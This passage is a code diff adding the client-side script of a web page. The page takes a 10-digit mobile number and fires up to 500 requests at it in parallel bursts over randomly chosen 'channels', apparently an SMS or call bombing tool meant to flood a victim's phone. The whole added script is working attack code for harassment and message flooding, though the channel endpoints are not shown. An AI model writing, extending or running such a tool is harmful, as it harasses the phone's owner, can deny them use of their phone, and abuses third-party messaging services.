@@ -512,4 +512,83 @@ async function fireOne(number, filter) {
     let ok = r.ok;
     try {
       const j = JSON.parse(txt);
-      if (j && j.stats && typeof j.stats.ok ==
+      if (j && j.stats && typeof j.stats.ok === "number") {
+        ok = j.stats.ok > 0;
+      } else if (j && j.status === false) {
+        ok = false;
+      }
+    } catch {}
+    return ok;
+  } catch { return false; }
+}
+
+fireBtn.addEventListener("click", async () => {
+  if (running) return;
+
+  const num = input.value.replace(/\D/g, "");
+  if (num.length !== 10) {
+    setStatus("Invalid input. Enter a valid 10-digit mobile number.", "err");
+    return;
+  }
+
+  total = Math.max(1, Math.min(500, parseInt(countInput.value) || 10));
+  const burst = Math.max(1, Math.min(30, parseInt(burstInput.value) || 6));
+  const channels = selectedFilter === "all" ? FILTERS : [selectedFilter];
+
+  running = true; stopFlag = false;
+  sent = 0; failed = 0; done = 0;
+
+  fireBtn.disabled = true;
+  haltBtn.disabled = false;
+  progressWrap.classList.add("active");
+  progressFill.style.width = "0%";
+  progressText.textContent = `0 / ${total}`;
+  refreshStats();
+  setStatus(`Initializing ${selectedFilter.toUpperCase()} sequence...`, "");
+
+  const dispatch = async () => {
+    if (stopFlag) return;
+    const filter = channels[Math.floor(Math.random() * channels.length)];
+    const ok = await fireOne(num, filter);
+    if (ok) sent++; else failed++;
+    done++;
+    const pct = Math.round((done / total) * 100);
+    progressFill.style.width = pct + "%";
+    progressText.textContent = `${done} / ${total} (${pct}%)`;
+    refreshStats();
+    if (done % 3 === 0 || done === total) {
+      setStatus(`[${done}/${total}] channel=${filter} · Sent: ${sent} | Failed: ${failed}`);
+    }
+  };
+
+  for (let i = 0; i < total; i += burst) {
+    if (stopFlag) break;
+    const batch = [];
+    for (let j = 0; j < burst && (i + j) < total; j++) batch.push(dispatch());
+    await Promise.allSettled(batch);
+  }
+
+  if (stopFlag) {
+    setStatus(`Sequence aborted · Sent=${sent} Failed=${failed}`, "err");
+  } else {
+    setStatus(`Sequence completed · Sent: ${sent} | Failed: ${failed}`, sent > 0 ? "ok" : "err");
+  }
+
+  running = false;
+  fireBtn.disabled = false;
+  haltBtn.disabled = true;
+});
+
+haltBtn.addEventListener("click", () => {
+  if (!running) return;
+  stopFlag = true;
+  setStatus("Halting pipeline...", "err");
+});
+
+input.addEventListener("keydown", e => { if (e.key === "Enter") fireBtn.click(); });
+</script>
+
+</body>
+</html>
+
+
